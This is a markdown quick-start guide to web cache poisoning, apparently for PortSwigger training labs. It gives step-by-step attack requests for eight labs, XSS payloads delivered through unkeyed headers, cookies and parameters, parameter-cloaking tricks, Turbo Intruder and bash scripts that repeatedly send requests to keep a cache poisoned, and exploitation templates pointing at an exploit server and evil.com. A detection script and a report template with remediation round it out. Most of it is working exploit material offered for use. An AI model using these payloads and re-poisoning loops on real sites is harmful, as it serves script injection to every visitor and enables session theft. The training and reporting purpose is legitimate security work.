# Web Cache Poisoning - Quick Start Guide

## 60-Second Vulnerability Check

```bash
# Quick test for X-Forwarded-Host
curl -I https://target.com/ -H "X-Forwarded-Host: test.com" | grep -E "test.com|X-Cache"

# Quick test for unkeyed parameter
curl -I "https://target.com/?utm_content=test123" | grep "X-Cache"
curl -I "https://target.com/?utm_content=different" | grep "X-Cache"
# If second shows "hit", parameter is unkeyed!
```

---

## Lab Speed-Run Guide

### Lab 1: Unkeyed Header (2-3 minutes)

**Quick Steps**:
1. Home page → Burp Repeater
2. Add: `X-Forwarded-Host: exploit-server.net`
3. Observe script src changes
4. Exploit server: Create `/resources/js/tracking.js` with `alert(document.cookie)`
5. Remove cache-buster, spam requests
6. Wait for `X-Cache: hit`

**One-Liner Test**:
```bash
curl -s https://target.com/ -H "X-Forwarded-Host: test.com" | grep "src="
```

---

### Lab 2: Multiple Headers (3-5 minutes)

**Quick Steps**:
1. Test `X-Forwarded-Scheme: nothttps` → Gets 302 redirect
2. Add `X-Forwarded-Host: exploit-server.net` → Redirect changes
3. Exploit server: `/resources/js/tracking.js` = `alert(document.cookie)`
4. Send both headers, remove cache-buster
5. Spam until `X-Cache: hit`

**Quick Test**:
```http
GET /resources/js/tracking.js HTTP/1.1
Host: target.com
X-Forwarded-Host: test.com
X-Forwarded-Scheme: nothttps
```

---

### Lab 3: Unkeyed Cookie (2-3 minutes)

**Quick Steps**:
1. Find `fehost` cookie in response
2. Repeater: `Cookie: fehost=abc"-alert(1)-"xyz`
3. Verify reflection in JavaScript
4. Remove cache-buster, spam requests
5. Visit homepage → alert fires

**Payload**:
```
fehost=abc"-alert(1)-"xyz
```

---

### Lab 4: Combining Vulnerabilities (15-20 minutes)

**Quick Steps**:
1. Create exploit server `/resources/json/translations.json`:
```json
{"en":{"name":"English"},"es":{"name":"español","translations":{"View details":"</a><img src=1 onerror='alert(document.cookie)' />"}}}
```
2. Add CORS header: `Access-Control-Allow-Origin: *`
3. Poison localized page:
```http
GET /?localized=1 HTTP/1.1
Cookie: lang=es
X-Forwarded-Host: exploit-server.net
```
4. Poison redirect:
```http
GET / HTTP/1.1
X-Original-URL: /setlang\es
```
5. Keep both poisoned simultaneously

---

### Lab 5: Strict Cacheability (5-7 minutes)

**Quick Steps**:
1. Get existing session cookie from browser
2. Exploit server: `/resources/json/geolocate.json`:
```json
{"country": "<img src=1 onerror=alert(document.cookie) />"}
```
3. Add CORS header
4. Repeater with session cookie:
```http
GET / HTTP/1.1
Cookie: session=EXISTING_VALUE
X-Forwarded-Host: exploit-server.net
```
5. Spam until cached (no Set-Cookie in response)

**Key**: Must use existing session to avoid Set-Cookie!

---

### Lab 6: Unkeyed Parameter (2-3 minutes)

**Quick Steps**:
1. Param Miner → "Guess GET parameters"
2. Find `utm_content` is unkeyed and reflected
3. Payload: `?utm_content='/><script>alert(1)</script>`
4. Test with cache-buster, then remove
5. Spam requests until cached

**One-Liner**:
```bash
curl "https://target.com/?utm_content=%27/%3E%3Cscript%3Ealert(1)%3C/script%3E"
```

---

### Lab 7: Parameter Cloaking (5-8 minutes)

**Quick Steps**:
1. Find `/js/geolocate.js?callback=setCountryCookie`
2. Cloaked URL:
```
/js/geolocate.js?callback=setCountryCookie&utm_content=x;callback=alert(1)
```
3. Cache sees: `callback=setCountryCookie&utm_content=x;callback=alert(1)`
4. Backend sees: `callback=alert(1)` (wins!)
5. Spam without cache-buster

**Key**: Semicolon hides parameter in Rails!

---

### Lab 8: Internal Cache (10-15 minutes)

**Quick Steps**:
1. Use Param Miner with dynamic cache-buster
2. Test `X-Forwarded-Host` with `?cb=RANDOM`
3. Observe internal caching (response stable despite external cache miss)
4. Exploit server: `/js/geolocate.js` = `alert(document.cookie)`
5. Spam with cache-busters:
```http
GET /?cb=1 HTTP/1.1
X-Forwarded-Host: exploit-server.net
```
```http
GET /?cb=2 HTTP/1.1
X-Forwarded-Host: exploit-server.net
```
6. Remove header and cache-buster to verify internal poisoning persists
7. Poison clean URL repeatedly

---

## Common Payloads

### X-Forwarded-Host Injection

```http
X-Forwarded-Host: exploit-server.net
```

**Result**:
```html
<script src="//exploit-server.net/script.js"></script>
```

---

### Cookie Reflection

```http
Cookie: fehost=abc"-alert(1)-"xyz
```

**Reflected in**:
```javascript
data = {"host":"abc"-alert(1)-"xyz"}
```

---

### Parameter Injection

```http
?utm_content='/><script>alert(1)</script>
```

**Result**:
```html
<link href='/?utm_content='/><script>alert(1)</script>'/>
```

---

### Parameter Cloaking

```http
?callback=safe&utm_content=x;callback=evil
```

**Cache key**: `callback=safe&utm_content=...`
**Backend parses**: `callback=evil`

---

## Burp Suite Speed Tips

### Param Miner Quick Setup

1. Right-click request
2. Extensions → Param Miner → "Guess headers"
3. Options:
   - ☑ Add dynamic cachebuster
   - ☑ Detect reflection
4. Review output tab

### Repeater Workflow

```
1. Send to Repeater (Ctrl+R)
2. Add cache-buster: ?cb=123
3. Test payload
4. Verify reflection
5. Remove cache-buster
6. Right-click → "Send to Turbo Intruder"
7. Set payload: for i in range(100): engine.queue(target.req)
```

### Turbo Intruder Script

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1)
    for i in range(100):
        engine.queue(target.req)

def handleResponse(req, interesting):
    if 'X-Cache: hit' in req.response:
        table.add(req)
```

---

## Common Mistakes

### Mistake 1: Forgetting Cache-Buster
❌ Test with `/?utm_content=payload` directly
✅ Test with `/?cb=123&utm_content=payload`

### Mistake 2: Not Waiting for Cache Hit
❌ Send once, give up
✅ Send 20+ times, watch for `X-Cache: hit`

### Mistake 3: Wrong Exploit Server Path
❌ `/tracking.js`
✅ `/resources/js/tracking.js`

### Mistake 4: Missing CORS Headers
❌ Just create JSON file
✅ Add `Access-Control-Allow-Origin: *` header

### Mistake 5: Testing Without Existing Session
❌ New request (gets Set-Cookie)
✅ Copy session from browser

### Mistake 6: Incorrect Parameter Cloaking Syntax
❌ `&callback=evil` (two parameters)
✅ `;callback=evil` (cloaked)

---

## Testing Checklist

### Initial Reconnaissance
- [ ] Identify cacheable pages (X-Cache headers)
- [ ] Check Age headers (cache lifetime)
- [ ] Review Vary headers (what's keyed)
- [ ] Run Param Miner for unkeyed inputs

### Header Testing
- [ ] X-Forwarded-Host
- [ ] X-Forwarded-Scheme
- [ ] X-Forwarded-Proto
- [ ] X-Original-URL
- [ ] X-Rewrite-URL
- [ ] Forwarded

### Parameter Testing
- [ ] utm_source, utm_medium, utm_content, utm_campaign
- [ ] gclid, fbclid
- [ ] tracking_id, affiliate_id
- [ ] callback, jsonp

### Cookie Testing
- [ ] Identify reflected cookies
- [ ] Test if cookies are in cache key
- [ ] Craft XSS payloads for cookie values

### Advanced Testing
- [ ] Multi-header combinations
- [ ] Parameter cloaking (semicolons)
- [ ] Internal vs external cache layers
- [ ] Cache normalization (backslash → forward slash)

---

## Speed Testing Workflow

### 1-Minute Test
```bash
# Quick header test
curl -I https://target.com/ -H "X-Forwarded-Host: test.com"
```

### 5-Minute Test
```bash
# Comprehensive check
for HEADER in X-Forwarded-Host X-Forwarded-Scheme X-Original-URL; do
  echo "Testing $HEADER"
  curl -s https://target.com/ -H "$HEADER: test.com" | grep "test.com" && echo "[!] REFLECTED"
done
```

### 15-Minute Test
1. Run Param Miner (headers + GET parameters)
2. Test top 3 findings manually
3. Craft exploit and test caching
4. Document findings

---

## Quick Detection Script

```python
import requests

def quick_test(url):
    headers_to_test = [
        ('X-Forwarded-Host', 'cache-poison-test.com'),
        ('X-Forwarded-Scheme', 'nothttps'),
        ('X-Original-URL', '/test'),
    ]

    for header_name, header_value in headers_to_test:
        r = requests.get(url, headers={header_name: header_value})

        # Check reflection
        if header_value in r.text:
            print(f"[!] {header_name} is REFLECTED")

            # Check if cacheable
            if 'X-Cache' in r.headers or 'CF-Cache-Status' in r.headers:
                print(f"[!] {header_name} affects CACHEABLE response")
                print(f"[!] VULNERABLE to cache poisoning via {header_name}")

quick_test("https://target.com/")
```

---

## Exploitation Templates

### Basic XSS via Header
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: exploit-server.net

# On exploit server:
# /resources/js/tracking.js:
alert(document.cookie)
```

### XSS via Parameter
```http
GET /?utm_content='/><script>alert(1)</script> HTTP/1.1
Host: target.com
```

### XSS via Cookie
```http
GET / HTTP/1.1
Host: target.com
Cookie: fehost="-alert(1)-"
```

### Open Redirect
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: nothttps

# Response: 302 to https://evil.com/
```

---

## Maintenance Script

```bash
#!/bin/bash
# Continuous cache poisoning

URL="https://target.com/"
HEADER="X-Forwarded-Host: exploit-server.net"

while true; do
  RESPONSE=$(curl -sI "$URL" -H "$HEADER")

  if echo "$RESPONSE" | grep -q "X-Cache: hit"; then
    echo "[+] Poisoned at $(date)"
  else
    echo "[-] Re-poisoning..."
  fi

  sleep 25  # Re-poison before 30s expiry
done
```

---

## Report Template

```markdown
# Web Cache Poisoning Vulnerability

## Summary
The application is vulnerable to web cache poisoning via [unkeyed input]. An attacker can inject malicious content that gets cached and served to all users.

## Severity
HIGH - Affects all users, enables XSS attacks

## Affected Components
- URL: https://target.com/
- Unkeyed Input: [X-Forwarded-Host / utm_content / cookie]
- Cache TTL: 30 seconds

## Reproduction Steps
1. Send request with malicious [header/parameter/cookie]:
   ```
   [HTTP request]
   ```
2. Response is cached (X-Cache: hit)
3. All subsequent users receive poisoned response
4. XSS payload executes: [screenshot]

## Proof of Concept
[Video/Screenshot showing alert execution]

## Impact
- XSS attacks affecting all users
- Session hijacking
- Credential theft
- Phishing attacks
- Scale: Affects thousands of users per poisoned cache entry

## Remediation
1. Include [input] in cache key
2. Validate and sanitize reflected values
3. Use Content-Security-Policy headers
4. Disable caching for dynamic content

## References
- https://portswigger.net/web-security/web-cache-poisoning
- CWE-644: Improper Neutralization of HTTP Headers
```

---

## Quick Reference Cards

### Cache Headers

| Header | Meaning |
|--------|---------|
| X-Cache: hit | Served from cache |
| X-Cache: miss | Served from backend |
| Age: 120 | Cached for 120 seconds |
| Cache-Control: max-age=300 | Cache for 5 minutes |
| Vary: Cookie | Cookie affects cache key |

### Common Unkeyed Inputs

| Input | Type | Common Usage |
|-------|------|--------------|
| X-Forwarded-Host | Header | Load balancing |
| X-Forwarded-Scheme | Header | SSL termination |
| X-Original-URL | Header | URL rewriting |
| utm_content | Parameter | Marketing tracking |
| utm_source | Parameter | Campaign tracking |
| gclid | Parameter | Google Ads |
| fbclid | Parameter | Facebook Ads |
| fehost | Cookie | Feature flags |

### Exploit Payloads by Context

| Context | Payload |
|---------|---------|
| Script src | `X-Forwarded-Host: exploit.com` |
| HTML | `?utm='/><script>alert(1)</script>` |
| JavaScript string | `cookie=";alert(1)//` |
| Callback | `callback=alert(1)` |
| Redirect | `X-Forwarded-Scheme: nothttps` |

---

**Quick Start Version**: 1.0
**Last Updated**: 2026-01-09
**Completion Time**: 15 minutes for all 8 labs with this guide

For complete exploitation details, see: `web-cache-poisoning-portswigger-labs-complete.md`
